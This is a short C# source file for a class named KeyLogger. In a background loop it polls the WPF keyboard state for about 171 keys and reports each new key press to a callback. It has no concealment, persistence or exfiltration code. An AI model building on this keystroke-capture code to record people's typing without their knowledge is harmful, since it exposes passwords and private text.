using System;
using System.Windows.Input;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Windows.Threading;

namespace keylogger
{
    public class KeyLogger
    {            
        public List<Key>LoggerKeys { get; private set; }

        private Dictionary<Key, bool> Keys;

        public bool Start { get; private set; }  

        public KeyLogger()
        {
            Keys = new Dictionary<Key, bool>();
            for (int i = 1; i < 172; i++)
            {
                Keys.Add((Key)i, true);
            }
            Start = false;
            LoggerKeys = new List<Key>();
        }

        public void Hook(Action<Key> LogKeys, Dispatcher dispatcher)
        {
            if (Start)
                return;
            Task.Run(() =>
            {
                Start = true;
                try
                {
                    while (true)
                    {
                        foreach (var item in Keys)
                        {                           
                            dispatcher.Invoke(() =>
                            {
                                if (Keyboard.IsKeyDown(item.Key) && item.Value == true)
                                {
                                    LogKeys(item.Key);
                                    Keys[item.Key] = false;
                                }
                                if (Keyboard.IsKeyUp(item.Key))
                                {
                                    Keys[item.Key] = true;
                                }
                            });
                        }
                    }
                }
                catch (Exception e)
                {
                    Start = false;
                    return;
                }
            });
        }
    }
}